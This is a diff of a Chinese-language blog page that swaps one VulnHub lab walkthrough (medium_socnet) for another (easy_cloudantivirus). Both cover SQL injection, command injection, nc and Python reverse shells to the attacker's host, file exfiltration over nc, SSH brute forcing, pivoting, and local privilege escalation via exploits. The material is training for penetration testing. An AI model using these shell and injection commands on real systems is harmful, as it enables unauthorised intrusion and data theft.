@@ -12,7 +12,7 @@
 
 
 
-<title>medium_socnet(打靶系列-1) | felzl</title>
+<title>easy_cloudantivirus(打靶系列-2) | felzl</title>
 
 
 
@@ -173,7 +173,7 @@
     
     <article class="post-wrap">
         <header class="post-header">
-            <h1 class="post-title">medium_socnet(打靶系列-1)</h1>
+            <h1 class="post-title">easy_cloudantivirus(打靶系列-2)</h1>
             
                 <div class="post-meta">
                     
@@ -182,7 +182,7 @@
 
                     
                         <span class="post-time">
-                        Date: <a href="#">December 2, 2021&nbsp;&nbsp;16:00:38</a>
+                        Date: <a href="#">December 6, 2021&nbsp;&nbsp;22:14:47</a>
                         </span>
                     
                     
@@ -200,153 +200,106 @@
         <div class="post-content">
             <ul>
 <li>靶机地址<ul>
-<li><a target="_blank" rel="noopener" href="https://download.vulnhub.com/boredhackerblog/medium_socnet.ova">https://download.vulnhub.com/boredhackerblog/medium_socnet.ova</a></li>
+<li><a target="_blank" rel="noopener" href="https://download.vulnhub.com/boredhackerblog/easy_cloudantivirus.ova">https://download.vulnhub.com/boredhackerblog/easy_cloudantivirus.ova</a></li>
 </ul>
 </li>
-<li>难度：中</li>
-</ul>
-<h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><ul>
+<li>难度：低<h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h4></li>
+<li>端口扫描</li>
+<li>WEB侦查</li>
+<li>SQL注入</li>
+<li>命令注入</li>
+<li>密码爆破</li>
+<li>代码审计</li>
+<li>NC串联</li>
+<li>本地提权<h4 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h4></li>
 <li>主机发现<ul>
-<li>arp-scan -l</li>
+<li><code>for i in $(seq 1 254); do sudo arping -c 2 192.168.2.$i; done</code></li>
 </ul>
 </li>
 <li>端口扫描<ul>
-<li>nmap -p-</li>
+<li>nmap -p- 192.168.2.113</li>
 </ul>
 </li>
-<li>服务发现<ul>
-<li>nmap -p22,5000 -sV</li>
+<li>扫描服务及版本<ul>
+<li>nmap -p22,8080 -sV 192.168.2.113</li>
 </ul>
 </li>
-<li>路径爬取<ul>
-<li>dirsearch</li>
+<li>发现8080是一个WEB服务<ul>
+<li>BP抓包，用字符字典跑一下</li>
+<li>报错：’select * from code where password=”‘ + password + ‘“‘</li>
 </ul>
 </li>
-<li>代码注入</li>
-<li>Shell脚本</li>
-<li>内网信息收集</li>
-<li>内网穿透<ul>
-<li>venom</li>
-<li>proxychains</li>
+<li>对报错语句分析<ul>
+<li>select * from code where password=” + password + “</li>
+<li>输入的 “ 会代入 password中报错</li>
 </ul>
 </li>
-<li>漏洞利用</li>
-<li>密码破解</li>
-<li>本地提权</li>
-<li>攻击代码修改</li>
-</ul>
-<h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><ul>
-<li>arp-scan -l<ul>
-<li>二层发现</li>
+<li>进行注入<ul>
+<li>select * from code where password=” + “ or 1=1 – + “</li>
+<li>测试 <code>&quot; or 1=1 -- </code> 成功注入</li>
 </ul>
 </li>
-<li>nmap -p- 192.168.3.110<ul>
-<li>开放端口</li>
-</ul>
-</li>
-<li>nmap -p22,5000 -sV 192.168.3.110<ul>
-<li>端口开放的服务</li>
-</ul>
-</li>
-<li>5000端口开放有Web服务，查看SQLi和XSS</li>
-<li>dirsearch 扫描Web目录<ul>
-<li>git clone <a target="_blank" rel="noopener" href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a></li>
-<li>python3 dirsearch.py -u <a target="_blank" rel="noopener" href="http://192.168.3.110:5000/">http://192.168.3.110:5000</a></li>
+<li>进入的页面是输入文件，就对其进行扫描，测试命令执行<ul>
+<li>cat | id</li>
+<li>存在命令执行</li>
 </ul>
 </li>
 <li>反弹shell<ul>
-<li>nc -nvlp 4444</li>
-<li><code>import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.3.111&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);</code></li>
+<li>先查看有没有nc<ul>
+<li>cat | which nc</li>
 </ul>
 </li>
-<li>发现在WEB系统docker容器中</li>
-<li>写脚本发现内网的其它主机<ul>
-<li><code>for i in $(seq 1 10); do ping -c 1 172.17.0.$i; done</code></li>
+<li>攻击机先监听：nc -nvlp 4444</li>
+<li>测试nc的版本支不支持 -e 参数<ul>
+<li>cat | nc 192.168.2.33 4444 -e /bin/bash</li>
+<li>cat | nc 192.168.2.33 4444</li>
+<li>第一条不成功，第二条成功</li>
 </ul>
 </li>
-<li>利用venom做代理<ul>
-<li><code>wget https://github.com/Dliv3/Venom/releases/download/v1.1.0/Venom.v1.1.0.7z</code></li>
-<li>cd “Venom v1.1.0”/</li>
-<li>./admin_linux_x64 -lport 9999</li>
-<li>python3 -m http.server 80</li>
-</ul>
-</li>
-<li>被攻击方下载工具<ul>
-<li>wget <a target="_blank" rel="noopener" href="http://192.168.3.111/agent_linux_x64">http://192.168.3.111/agent_linux_x64</a></li>
-<li>chmod +x agent_linux_x64</li>
-<li>./agent_linux_x64 -rhost 192.168.3.111 -rport 9999</li>
-</ul>
-</li>
-<li>venom<ul>
-<li>show ：查看已连接节点</li>
-<li>goto 1 ：进入节点 1</li>
-<li>socks 1088 ：启动socks代理，1088端口</li>
-</ul>
-</li>
-<li>配置proxychains<ul>
-<li>vim /etc/proxychains.conf</li>
-<li>在最后加入：<code>socks5 127.0.0.1 1088</code></li>
-</ul>
-</li>
-<li>利用proxychains扫描内网主机<ul>
-<li>proxychains nmap -Pn -sT 172.17.0.1</li>
-<li>proxychains nmap -p22,5000 -Pn -sT -sV 172.17.0.1</li>
-</ul>
-</li>
-<li>发现5000端口上有相同的WEB站点<ul>
-<li>用浏览器配置下1088的socks代理访问<ul>
-<li>发现与docker容器中是同一应用</li>
+<li>使用 nc 串联<ul>
+<li>攻击机监听 nc -nvlp 3333  和 nc -nvlp 4444</li>
+<li>cat | nc 192.168.2.33 3333 | /bin/bash | nc 192.168.2.33 4444</li>
+<li>在 3333 的容器输入命令，在 4444 的窗口回显结果</li>
 </ul>
 </li>
 </ul>
 </li>
-<li>测试内网中的另一主机<ul>
-<li>proxychains nmap -Pn -sT 172.17.0.2</li>
-<li>proxychains nmap -p9200 -Pn -sT -sV 172.17.0.2<ul>
-<li>发现 Elasticsearch REST API 1.4.2</li>
+<li>查看了一些文件后，发面有个sqlite的文件在上无法查看，把它下下来<ul>
+<li>nc -nvlp 5555 &gt; db.sql</li>
+<li>在shell中输入 nc 192.168.2.33 &lt; database.sql</li>
+</ul>
+</li>
+<li>在kali上查看sqlite文件<ul>
+<li>sqlite3</li>
+<li>.open db.sql</li>
+<li>.database</li>
+<li>.dump</li>
+<li>发现4个密码，记录passwd.txt</li>
+</ul>
+</li>
+<li>查找账号<ul>
+<li>cat /etc/passwd</li>
+<li>cat /etc/passwd | grep /bin/bash</li>
+<li>确定了3个账号可用，记录user.txt</li>
+</ul>
+</li>
+<li>SSH爆破<ul>
+<li>hydra -L user.txt -P passwd.txt ssh://192.168.2.113</li>
+<li>爆破失败</li>
+</ul>
+</li>
+<li>在上一级目录发现 update_cloudav 的文件和 .c源代码<ul>
+<li>update_cloudav有s标记位，且属主为root</li>
+<li>先查看源代码</li>
+<li>测试程序：./update_cloudav a</li>
+<li>测试payload：./update_cloudav “a | nc 192.168.2.33 5555 | /bin/bash | nc 192.168.2.33 6666”</li>
 </ul>
 </li>
 </ul>
-</li>
-<li>利用matesploit查看相关服务的漏洞<ul>
-<li>searchsploit Elasticsearch<ul>
-<li>ElasticSearch - Remote Code Execution | linux/remote/36337.py</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>将利用脚本复制出来<ul>
-<li><code>cp /usr/share/exploitdb/exploits/linux/remote/36337.py .</code></li>
-</ul>
-</li>
-<li>安装pip<ul>
-<li>pip(python2)安装：</li>
-<li>wget <a target="_blank" rel="noopener" href="https://bootstrap.pypa.io/pip/2.7/get-pip.py">https://bootstrap.pypa.io/pip/2.7/get-pip.py</a></li>
-<li>python2 get-pip.py</li>
-<li>pip -V</li>
-<li>pip3(python3)安装</li>
-<li>wget <a target="_blank" rel="noopener" href="https://bootstrap.pypa.io/pip/get-pip.py">https://bootstrap.pypa.io/pip/get-pip.py</a></li>
-<li>python3 get-pip.py</li>
-<li>pip -V</li>
-</ul>
-</li>
-<li>python2 -m pip install requests</li>
-<li>查看一下，脚本语言的版本和用法<ul>
-<li>proxychains python2 36337.py 172.17.0.2</li>
-</ul>
-</li>
-<li>发现password文件，破解文件中的md5，然后尝试登录</li>
-<li>只有john能用，登录上后是普通用户权限</li>
-<li>因为此系统是较老的系统，利用内核漏洞提权<ul>
-<li>searchsploit linux 3.13</li>
-<li>cp /usr/share/exploitdb/exploits/linux/local/37292.c .</li>
-<li>vi 37292.c ：删除要二次编译的代码<ul>
-<li><img src="/image/2021120101.png" alt="avatar"></li>
-</ul>
-</li>
-<li>gcc -o exp 37292.c</li>
-<li>locate ofs-lib.so ：查看库文件的位置</li>
-<li>根据代码，在本机编译后，把可执行文件和库文件发送到目标主机tmp目录</li>
+<hr>
+<ul>
+<li>kali的字典一般在<ul>
+<li>/usr/share/wordlists</li>
 </ul>
 </li>
 </ul>
@@ -364,7 +317,7 @@
                 
                     <p class="copyright-item">
                         <span>Permalink:</span>
-                        <span><a href="https://felzl.github.io/2021/12/02/medium-socnet-%E6%89%93%E9%9D%B6%E7%B3%BB%E5%88%97-1/">https://felzl.github.io/2021/12/02/medium-socnet-%E6%89%93%E9%9D%B6%E7%B3%BB%E5%88%97-1/</a></span>
+                        <span><a href="https://felzl.github.io/2021/12/06/easy-cloudantivirus-%E6%89%93%E9%9D%B6%E7%B3%BB%E5%88%97-2/">https://felzl.github.io/2021/12/06/easy-cloudantivirus-%E6%89%93%E9%9D%B6%E7%B3%BB%E5%88%97-2/</a></span>
                     </p>
                 
                 
@@ -388,11 +341,11 @@
                 <span class="tag">
                     
                     
-                        <a href="/tags/python/"># python</a>
-                    
                         <a href="/tags/kali-linux/"># kali linux</a>
                     
-                        <a href="/tags/nmap/"># nmap</a>
+                        <a href="/tags/SQL%E6%B3%A8%E5%85%A5/"># SQL注入</a>
+                    
+                        <a href="/tags/NC/"># NC</a>
                     
                         
                 </span>
@@ -405,10 +358,8 @@
         </section>
         <section class="post-nav">
             
-                <a class="prev" rel="prev" href="/2021/12/06/easy-cloudantivirus-%E6%89%93%E9%9D%B6%E7%B3%BB%E5%88%97-2/">easy_cloudantivirus(打靶系列-2)</a>
             
-            
-            <a class="next" rel="next" href="/2021/11/09/%E7%A7%91%E6%8B%89%E8%8C%A8%E7%8C%9C%E6%83%B3%E7%9B%B8%E5%85%B3%E7%9A%84%E4%B8%80%E9%81%93%E9%A2%98/">科拉茨猜想相关的一道题</a>
+            <a class="next" rel="next" href="/2021/12/02/medium-socnet-%E6%89%93%E9%9D%B6%E7%B3%BB%E5%88%97-1/">medium_socnet(打靶系列-1)</a>
             
         </section>
 
